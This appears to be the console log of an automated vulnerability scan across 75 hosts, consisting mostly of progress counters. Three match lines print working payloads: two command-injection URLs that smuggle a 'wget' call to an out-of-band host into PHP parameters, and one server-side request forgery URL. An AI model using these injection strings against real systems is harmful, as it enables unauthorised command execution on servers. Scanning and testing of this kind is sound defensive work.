[+] Started: Fri Jul  3 23:15:37 UTC 2026
[+] Run ID: 28656575281
[+] Batch: batch-0012
[+] URL count: 75
[0:00:05] | Templates: 6749 | Hosts: 75 | RPS: 60 | Matched: 0 | Errors: 0 | Requests: 319/1118775 (0%)
[[92mCVE-2014-3206[0m] [[94mhttp[0m] [[31mcritical[0m] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d94457tulefjdnsorvog3z6z46kqoitsc.oast.fun;
[0:03:10] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 1 | Errors: 1 | Requests: 12031/1118775 (1%)
[0:03:15] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 1 | Errors: 1 | Requests: 12344/1118775 (1%)
[[92mCVE-2014-3206[0m] [[94mhttp[0m] [[31mcritical[0m] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d94457tulefjdnsorvogbe5w7fmugdk9y.oast.fun;
[0:03:20] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 12704/1118775 (1%)
[0:03:25] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 13029/1118775 (1%)
[0:03:30] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 13332/1118775 (1%)
[0:03:35] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 13611/1118775 (1%)
[0:03:40] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 13908/1118775 (1%)
[0:03:45] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 14216/1118775 (1%)
[0:03:50] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 14599/1118775 (1%)
[0:03:55] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 14996/1118775 (1%)
[0:04:00] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 1 | Requests: 15366/1118775 (1%)
[0:04:05] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 2 | Errors: 1 | Requests: 15742/1118775 (1%)
[0:04:10] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 2 | Errors: 1 | Requests: 16144/1118775 (1%)
[0:04:15] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 2 | Errors: 1 | Requests: 16521/1118775 (1%)
[0:04:20] | Templates: 6749 | Hosts: 75 | RPS: 65 | Matched: 2 | Errors: 1 | Requests: 16968/1118775 (1%)
[0:04:25] | Templates: 6749 | Hosts: 75 | RPS: 65 | Matched: 2 | Errors: 1 | Requests: 17383/1118775 (1%)
[0:04:30] | Templates: 6749 | Hosts: 75 | RPS: 65 | Matched: 2 | Errors: 1 | Requests: 17815/1118775 (1%)
[0:04:35] | Templates: 6749 | Hosts: 75 | RPS: 66 | Matched: 2 | Errors: 1 | Requests: 18246/1118775 (1%)
[0:04:40] | Templates: 6749 | Hosts: 75 | RPS: 66 | Matched: 2 | Errors: 1 | Requests: 18679/1118775 (1%)
[0:04:45] | Templates: 6749 | Hosts: 75 | RPS: 67 | Matched: 2 | Errors: 1 | Requests: 19129/1118775 (1%)
[0:04:50] | Templates: 6749 | Hosts: 75 | RPS: 67 | Matched: 2 | Errors: 1 | Requests: 19571/1118775 (1%)
[0:04:55] | Templates: 6749 | Hosts: 75 | RPS: 67 | Matched: 2 | Errors: 1 | Requests: 19985/1118775 (1%)
[0:05:00] | Templates: 6749 | Hosts: 75 | RPS: 68 | Matched: 2 | Errors: 1 | Requests: 20423/1118775 (1%)
[0:05:05] | Templates: 6749 | Hosts: 75 | RPS: 68 | Matched: 2 | Errors: 1 | Requests: 20856/1118775 (1%)
[0:05:10] | Templates: 6749 | Hosts: 75 | RPS: 68 | Matched: 2 | Errors: 1 | Requests: 21310/1118775 (1%)
[0:05:15] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 21801/1118775 (1%)
[0:05:20] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 22193/1118775 (1%)
[0:05:25] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 22561/1118775 (2%)
[0:05:30] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 22934/1118775 (2%)
[0:05:35] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 23306/1118775 (2%)
[0:05:40] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 23632/1118775 (2%)
[0:05:45] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 23934/1118775 (2%)
[0:05:50] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 24251/1118775 (2%)
[0:05:55] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 24561/1118775 (2%)
[0:06:00] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 24881/1118775 (2%)
[0:06:05] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 25218/1118775 (2%)
[0:06:10] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 25551/1118775 (2%)
[0:06:15] | Templates: 6749 | Hosts: 75 | RPS: 68 | Matched: 2 | Errors: 1 | Requests: 25871/1118775 (2%)
[0:06:20] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 26242/1118775 (2%)
[0:06:25] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 26717/1118775 (2%)
[0:06:30] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 1 | Requests: 27181/1118775 (2%)
[0:06:35] | Templates: 6749 | Hosts: 75 | RPS: 70 | Matched: 2 | Errors: 1 | Requests: 27696/1118775 (2%)
[0:06:40] | Templates: 6749 | Hosts: 75 | RPS: 70 | Matched: 2 | Errors: 1 | Requests: 28246/1118775 (2%)
[0:06:45] | Templates: 6749 | Hosts: 75 | RPS: 71 | Matched: 2 | Errors: 1 | Requests: 28818/1118775 (2%)
[0:06:50] | Templates: 6749 | Hosts: 75 | RPS: 71 | Matched: 2 | Errors: 1 | Requests: 29465/1118775 (2%)
[0:06:55] | Templates: 6749 | Hosts: 75 | RPS: 72 | Matched: 2 | Errors: 2 | Requests: 30132/1118775 (2%)
[0:07:00] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 2 | Requests: 30820/1118775 (2%)
[0:07:05] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 2 | Requests: 31524/1118775 (2%)
[0:07:10] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 2 | Requests: 32242/1118775 (2%)
[0:07:15] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 2 | Requests: 32966/1118775 (2%)
[0:07:20] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 2 | Requests: 33591/1118775 (3%)
[0:07:25] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 2 | Requests: 34100/1118775 (3%)
[0:07:30] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 2 | Requests: 34573/1118775 (3%)
[0:07:35] | Templates: 6749 | Hosts: 75 | RPS: 77 | Matched: 2 | Errors: 2 | Requests: 35059/1118775 (3%)
[[92mCVE-2017-9506[0m] [[94mhttp[0m] [[33mmedium[0m] https://ddocs-indexer.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://d94457tulefjdnsorvogbzj6g7qjs6x3h.oast.fun
[0:07:40] | Templates: 6749 | Hosts: 75 | RPS: 77 | Matched: 3 | Errors: 2 | Requests: 35464/1118775 (3%)
[0:07:45] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 2 | Requests: 35807/1118775 (3%)
[0:07:50] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 4 | Requests: 36111/1118775 (3%)
[0:07:55] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 8 | Requests: 36427/1118775 (3%)
[0:08:00] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 10 | Requests: 36771/1118775 (3%)
[0:08:05] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 10 | Requests: 37139/1118775 (3%)
[0:08:10] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 12 | Requests: 37465/1118775 (3%)
[0:08:15] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 14 | Requests: 37804/1118775 (3%)
[0:08:20] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 14 | Requests: 38157/1118775 (3%)
[0:08:25] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 3 | Errors: 14 | Requests: 38470/1118775 (3%)
[0:08:30] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 3 | Errors: 14 | Requests: 38741/1118775 (3%)
[0:08:35] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 3 | Errors: 14 | Requests: 39051/1118775 (3%)
[0:08:40] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 3 | Errors: 14 | Requests: 39319/1118775 (3%)
[0:08:45] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 3 | Errors: 14 | Requests: 39621/1118775 (3%)
[0:08:50] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 3 | Errors: 14 | Requests: 39885/1118775 (3%)
[0:08:55] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 3 | Errors: 14 | Requests: 40147/1118775 (3%)
[0:09:00] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 14 | Requests: 40416/1118775 (3%)
[0:09:05] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 14 | Requests: 40676/1118775 (3%)
[0:09:10] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 14 | Requests: 40937/1118775 (3%)
[0:09:15] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 14 | Requests: 41206/1118775 (3%)
[0:09:20] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 14 | Requests: 41496/1118775 (3%)
[0:09:25] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 41806/1118775 (3%)
[0:09:30] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 42166/1118775 (3%)
[0:09:35] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 42526/1118775 (3%)
[0:09:40] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 42905/1118775 (3%)
[0:09:45] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 43319/1118775 (3%)
[0:09:50] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 43788/1118775 (3%)
[0:09:55] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 44292/1118775 (3%)
[0:10:00] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 44755/1118775 (4%)
[0:10:05] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 45182/1118775 (4%)
[0:10:10] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 45622/1118775 (4%)
[0:10:15] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 45968/1118775 (4%)
[0:10:20] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 46282/1118775 (4%)
[0:10:25] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 46614/1118775 (4%)
[0:10:30] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 46979/1118775 (4%)
[0:10:35] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 47338/1118775 (4%)
[0:10:40] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 47723/1118775 (4%)
[0:10:45] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 48129/1118775 (4%)
[0:10:50] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 48536/1118775 (4%)
[0:10:55] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 49038/1118775 (4%)
[0:11:00] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 49346/1118775 (4%)
[0:11:05] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 49664/1118775 (4%)
[0:11:10] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 50024/1118775 (4%)
[0:11:15] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 50307/1118775 (4%)
[0:11:20] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 50614/1118775 (4%)
[0:11:25] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 50938/1118775 (4%)
[0:11:30] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 51211/1118775 (4%)
[0:11:35] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 51539/1118775 (4%)
[0:11:40] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 16 | Requests: 51859/1118775 (4%)
[0:11:45] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 52071/1118775 (4%)
[0:11:50] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 52301/1118775 (4%)
[0:11:55] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 52593/1118775 (4%)
[0:12:00] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 52889/1118775 (4%)
[0:12:05] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 16 | Requests: 53209/1118775 (4%)
[0:12:10] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 40 | Requests: 53523/1118775 (4%)
[0:12:15] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 40 | Requests: 53785/1118775 (4%)
[0:12:20] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 40 | Requests: 54135/1118775 (4%)
[0:12:25] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 40 | Requests: 54578/1118775 (4%)
[0:12:30] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 42 | Requests: 55045/1118775 (4%)
[0:12:35] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 48 | Requests: 55543/1118775 (4%)
[0:12:40] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 48 | Requests: 55980/1118775 (5%)
[0:12:45] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 48 | Requests: 56447/1118775 (5%)
[0:12:50] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 48 | Requests: 56861/1118775 (5%)
[0:12:55] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 76 | Requests: 57278/1118775 (5%)
[0:13:00] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 76 | Requests: 57649/1118775 (5%)
[0:13:05] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 76 | Requests: 57984/1118775 (5%)
[0:13:10] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 76 | Requests: 58313/1118775 (5%)
[0:13:15] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 86 | Requests: 58700/1118775 (5%)
[0:13:20] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 100 | Requests: 59330/1118775 (5%)
[0:13:25] | Templates: 6749 | Hosts: 75 | RPS: 77 | Matched: 3 | Errors: 100 | Requests: 62434/1118775 (5%)
[0:13:30] | Templates: 6749 | Hosts: 75 | RPS: 81 | Matched: 3 | Errors: 100 | Requests: 65750/1118775 (5%)
[0:13:35] | Templates: 6749 | Hosts: 75 | RPS: 83 | Matched: 3 | Errors: 100 | Requests: 68052/1118775 (6%)
[0:13:40] | Templates: 6749 | Hosts: 75 | RPS: 85 | Matched: 3 | Errors: 112 | Requests: 70386/1118775 (6%)
[0:13:45] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 120 | Requests: 72903/1118775 (6%)
[0:13:50] | Templates: 6749 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 120 | Requests: 75528/1118775 (6%)
[0:13:55] | Templates: 6749 | Hosts: 75 | RPS: 91 | Matched: 3 | Errors: 120 | Requests: 76195/1118775 (6%)
[0:14:00] | Templates: 6749 | Hosts: 75 | RPS: 91 | Matched: 3 | Errors: 124 | Requests: 76475/1118775 (6%)
[0:14:05] | Templates: 6749 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 146 | Requests: 76771/1118775 (6%)
[0:14:10] | Templates: 6749 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 152 | Requests: 77055/1118775 (6%)
[0:14:15] | Templates: 6749 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 152 | Requests: 77310/1118775 (6%)
[0:14:20] | Templates: 6749 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 152 | Requests: 77623/1118775 (6%)
[0:14:25] | Templates: 6749 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 156 | Requests: 77934/1118775 (6%)
[0:14:30] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 176 | Requests: 78285/1118775 (6%)
[0:14:35] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 177 | Requests: 78627/1118775 (7%)
[0:14:40] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 177 | Requests: 78931/1118775 (7%)
[0:14:45] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 181 | Requests: 79277/1118775 (7%)
[0:14:50] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 189 | Requests: 79565/1118775 (7%)
[0:14:55] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 189 | Requests: 79920/1118775 (7%)
[0:15:00] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 189 | Requests: 80273/1118775 (7%)
[0:15:05] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 189 | Requests: 80629/1118775 (7%)
[0:15:10] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 80994/1118775 (7%)
[0:15:15] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 81354/1118775 (7%)
[0:15:20] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 81685/1118775 (7%)
[0:15:25] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 82038/1118775 (7%)
[0:15:30] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 82496/1118775 (7%)
[0:15:35] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 82959/1118775 (7%)
[0:15:40] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 83468/1118775 (7%)
[0:15:45] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 84050/1118775 (7%)
[0:15:50] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 84525/1118775 (7%)
[0:15:55] | Templates: 6749 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 189 | Requests: 85100/1118775 (7%)
[0:16:00] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 85419/1118775 (7%)
[0:16:05] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 85723/1118775 (7%)
[0:16:10] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 86035/1118775 (7%)
[0:16:15] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 86371/1118775 (7%)
[0:16:20] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 86695/1118775 (7%)
[0:16:25] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 87036/1118775 (7%)
[0:16:30] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 87355/1118775 (7%)
[0:16:35] | Templates: 6749 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 189 | Requests: 87660/1118775 (7%)
[0:16:40] | Templates: 6749 | Hosts: 75 | RPS: 87 | Matched: 3 | Errors: 189 | Requests: 87968/1118775 (7%)
